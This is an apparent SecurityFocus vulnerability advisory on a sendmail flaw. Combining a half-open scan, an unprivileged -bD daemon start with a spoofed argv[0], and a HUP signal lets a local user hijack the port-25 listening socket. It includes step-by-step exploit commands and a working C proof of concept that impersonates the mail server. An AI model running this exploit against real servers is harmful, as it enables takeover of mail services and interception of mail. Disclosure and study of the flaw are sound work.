source: http://www.securityfocus.com/bid/774/info

Through exploiting a combination of seemingly low-risk vulnerabilities in sendmail, it is possible for a malicious local user to have an arbitrary program inherit (or "hijack") the file descriptor for the socket listening on (priviliged) port 25.

The problem begins with the way sendmail handles the failure of an accept() call. The accept() call is made when a tcp syn packet is recieved by a listening tcp socket. When the three-way handshake does not complete (as is the consequence of a half-open tcp "stealth scan"), accept() fails and sendmail closes all listening sockets and sleeps for 5 seconds.

The second problem is that a user can start the sendmail daemon if a more obscure argument is passed (-bD). The -bD flag tells sendmail to run as a daemon, but in foreground. User priviliges are not checked against for this option, allowing any user to start sendmail.

The third problem is how sendmail reacts to a HUP signal. When a HUP is recieved, sendmail calls execve(argv[0],..) to restart itself. The problem here is obvious, since argv[0] can be changed to anything. The bigger problem here though, is that the fourth file descriptor is not closed before this is done (which happens to be the one for the listening tcp socket), thus any argv[0] which is executed via the execve() call will inherit the descriptor.

The steps required to exploit this are as follows:

- From another machine, use nmap to do a "half open scan" on port 25 of the target host.
(this will make sendmail go to sleep for five seconds, unattached to port 25)

- In the 5 seconds that sendmail spends sleeping, call sendmail -bD as a user locally on the target box with noexec and set argv[0] to the program of your choice.
(noexec is a program which allows you to set argv[0] to whatever you'd like).

- Send the process a HUP, which is ok since you own the process.
(The program you specified in the noexec command which is to be argv[0] now has the file descriptor for the socket listening on port 25).

The consequences of this are full compromise of the mail server. An attacker could write a trojan "mail server" that would respond on port 25 to legitimate smtp connections. 

#include <netinet/in.h>
#include <fcntl.h>

#define SERV_FD 4

main() {
struct sockaddr_in saddr;
int csock,i=sizeof(saddr);
while (1) {
while ((csock=accept(SERV_FD,&saddr,&i))<0);
if (!fork()) {
dup2(csock,0);
dup2(csock,1);
dup2(csock,2);
printf("220 Takeover ESMTP mail service - road closed.\n");
fflush(0);
sleep(1);
shutdown(csock,2);
close(csock);
exit(0);
}
}
}
EOF

victim$ gcc test.c -o test

(compile simple harmless sendmail-imposter)

attacker# nmap -p 25 -sS -P0 -n victim

(half open tcp connection is made, original smtpd goes to sleep for 5 seconds)

victim$ doexec /usr/sbin/sendmail /tmp/test -bD

(user starts sendmail, arvg[0] replaced with '/tmp/test')

victim$ killall -HUP sendmail

(user sends HUP to sendmail, /tmp/test is executed)

victim$telnet localhost 25
220 Takeover ESMTP mail service - road closed.
victim$ 